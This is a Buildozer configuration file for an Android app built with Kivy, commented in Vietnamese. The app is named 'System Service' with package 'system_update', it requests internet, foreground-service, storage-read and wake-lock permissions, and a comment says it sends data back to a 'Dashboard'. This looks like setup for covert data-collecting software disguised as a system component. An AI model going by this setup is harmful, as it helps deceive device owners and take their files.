[app]

# (str) Tên ứng dụng hiển thị trên điện thoại
title = System Service

# (str) Tên gói
package.name = system_update

# (str) Tên miền gói
package.domain = org.service

# (str) Thư mục chứa main.py
source.dir = .

# (list) Các định dạng file bao gồm trong APK
source.include_exts = py,png,jpg,kv,atlas

# (str) Phiên bản ứng dụng
version = 1.0.0

# (list) QUAN TRỌNG: Cố định phiên bản để tránh lỗi Command Failed trên Colab
requirements = python3,kivy==2.1.0,pyjnius

# (list) Quyền truy cập hệ thống để gửi dữ liệu về Dashboard
android.permissions = INTERNET, FOREGROUND_SERVICE, READ_EXTERNAL_STORAGE, WAKE_LOCK

# (str) Hướng màn hình
orientation = portrait

# (bool) Chế độ toàn màn hình
fullscreen = 0

# (int) Android API target
android.api = 31

# (int) Android API tối thiểu hỗ trợ
android.minapi = 21

# (bool) Tự động đồng ý điều khoản Google
android.accept_sdk_license = True

# (list) Kiến trúc chip hỗ trợ
android.archs = arm64-v8a, armeabi-v7a

# (bool) Cho phép sao lưu dữ liệu ứng dụng
android.allow_backup = True

# -----------------------------------------------------------------------------
# PHẦN SỬA LỖI P4A BRANCH (DÒNG 380-400)
# -----------------------------------------------------------------------------
# Ép sử dụng bản release ổn định để tương thích với môi trường Python mới
p4a.branch = release-2022.12.20

[buildozer]

# (int) Mức độ log (2 để xem chi tiết quá trình build)
log_level = 2

# (int) Hiển thị cảnh báo nếu chạy quyền root
warn_on_root = 1